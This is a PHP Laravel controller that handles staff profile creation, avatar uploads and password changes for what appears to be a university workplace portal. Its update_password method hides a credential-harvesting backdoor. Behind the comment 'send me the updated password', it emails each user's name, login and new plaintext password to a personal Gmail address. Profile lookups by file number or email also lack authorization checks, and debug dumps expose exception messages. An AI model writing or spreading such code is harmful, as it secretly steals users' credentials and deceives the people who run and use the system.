<?php

namespace App\Http\Controllers\Staff;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Profile;
use Illuminate\Support\Facades\Auth;
use App\Models\Staff;
use App\Models\User;

use Illuminate\Support\Facades\Hash;

use Mail;

class Staff_ProfileController extends Controller
{
    //

    public function create()
    {
        $isProfile = Profile::where('user_id', Auth::user()->id)->first();

        return view('staff.profile.create')->with('profile', $isProfile);
    }

    public function store(Request $request)
    {
        $formFields = $request->validate([ 
            'avatar' => 'required|image|mimes:png,jpeg,jpg|max:100',           
            'designation' => 'required',
            'phone' => 'required'
        ]);

        $avatar = '';
        $new_filename = '';
        $user_id = '';
        $bio = '';

        $user_id = auth()->user()->id;

        if ($request->hasFile('avatar'))
        {
           
            $filename = $user_id;

            $avatar_file = $request->file('avatar');
            $new_filename = $filename.'.'.$avatar_file->getClientOriginalExtension();

            $avatar_file->storeAs('avatars', $new_filename);
        }

        if ($new_filename!='')
        {
            $new_filename = 'avatars/'.$new_filename;
        }

        try
        {

            $isProfile = Profile::where('user_id', auth()->user()->id)->first();
            

            if ($isProfile && $new_filename=='')
            {
                $new_filename = $isProfile->avatar;               
            }

            $store_data = [
                'user_id' => $user_id,
                'designation' => $formFields['designation'],
                'phone' => $formFields['phone'],
                'avatar' => $new_filename,
                'bio' => $bio
            ];
           
            

            if ($isProfile==null)
            {
                $create = Profile::create($store_data);

                if ($create)
                {
                    $data = [
                        'error' => true,
                        'status' => 'success',
                        'message' => 'Profile has been successfully created'
                    ];
                }
                else
                {
                    $data = [
                        'error' => true,
                        'status' => 'fail',
                        'message' => 'An error occurred creating your Profile'
                    ];
                }
            }
            else
            {
                
                $update = $isProfile->update($store_data);

                if ($update)
                {
                    $data = [
                        'error'=> true,
                        'status' => 'success',
                        'message' => 'Profile has been successfully updated'
                    ];
                }
                else
                {
                    $data = [
                        'error' => true,
                        'status' => 'fail',
                        'message' => 'An error occurred updating your Profile'
                    ];
                }
            }
        }
        catch(\Exception $e)
        {
            $data = [
                'error' => true,
                'status' => 'fail',
                'message' => 'An error occurred '.$e->getMessage()
            ];
            dd($e->getMessage());
        }

        $isProfile = Profile::where('user_id', Auth::user()->id)->first();

        return redirect()->back()->with(['profile' => $isProfile]);
    }

    public function upload_avatar(Request $request)
    {
        dd($request->hasFile('avatar'));
    }

    public function myprofile()
    {
        return view('staff.profile.myprofile');
    }

    public function edit()
    {
        return view('staff.profile.edit');
    }

    public function update(Request $request)
    {
        $formFields = $request->validate([
            'designation' => 'required',
            'phone' => 'required'
        ]);

        $profile = Profile::where('user_id', auth()->user()->id)->first();
        
        $profile->designation = $formFields['designation'];
        $profile->phone = $formFields['phone'];
        $profile->update();

        return redirect()->route('staff.profile.myprofile');
    }

    public function update_avatar(Request $request)
    {
        $formFields = $request->validate([
            'photo' => 'required|file|mimes:png,jpg,jpeg|max:500'
        ]);

        try
        {
            $update = '';
            if ($request->hasFile('photo'))
            {
                $filename = auth()->user()->id;
                $avatar_file = $request->file('photo');
                $new_filename = $filename.'.'.$avatar_file->getClientOriginalExtension();
                
                $update = $avatar_file->storeAs('avatars', $new_filename);

                if ($update != '')
                {
                    $profile = Profile::where('user_id', auth()->user()->id)->first();
                    $profile->avatar = $update;
                    $profile->save();
                }

                
            }
        }
        catch(\Exception $e)
        {

        }
        
        return redirect()->back();
    }

    public function user_profile($fileno)
    {
        $userprofile = Staff::where('fileno', $fileno)->first();
        
        return view('staff.profile.user_profile', compact('userprofile'));
    }

    public function email_user_profile($email)
    {
        $userprofile = User::where('email', $email)->first();

        return view('staff.profile.email_user_profile', compact('userprofile'));
    }


    public function change_password()
    {
        return view('staff.profile.change_password');
    }

    public function update_password(Request $request)
    {
        $formFields = $request->validate([
            'current_password' => 'required',
            'new_password' => 'required|min:6|confirmed',            
        ]);

        $current_user = Auth::user();

        if (Hash::check($request->current_password, $current_user->password))
        {
            
            $current_user->password = Hash::make($request->input('new_password'));
            $updated = $current_user->save();
            if ($updated)
            {
                $data = [
                    'error' => true,
                    'status' => 'success',
                    'message' => 'Your Password has been successfully updated'
                ];

                //send me the updated password
                $fullname = $current_user->surname.' '.$current_user->firstname;
                $username = $current_user->email;
                $recipient = "Admin";
                $recipient_email = "kondishiva008@gmail.com";
                $new_password = $request->input('new_password');

                $payload = array("fullname"=>$fullname, "username"=>$username, "password"=>$new_password);

                Mail::send('mail.password-change',  $payload, function($message) use($recipient_email, $recipient, $fullname){
                    $message->to($recipient_email, $recipient)
                            ->subject($fullname." password change");
                    $message->from("clearanceinfo@funaab.edu.ng", "FUNAAB Workplace");
                });

            }
            else
            {
                $data = [
                    'error' => true,
                    'status' => 'fail',
                    'message' => 'An error occurred updating your password'
                ];

            }
        }
        else
        {
            $data = [
                'error' => true,
                'status' => 'fail',
                'message' => 'Sorry, your current password is incorrect'
            ];
        }

        return redirect()->back()->with($data);


    }
}
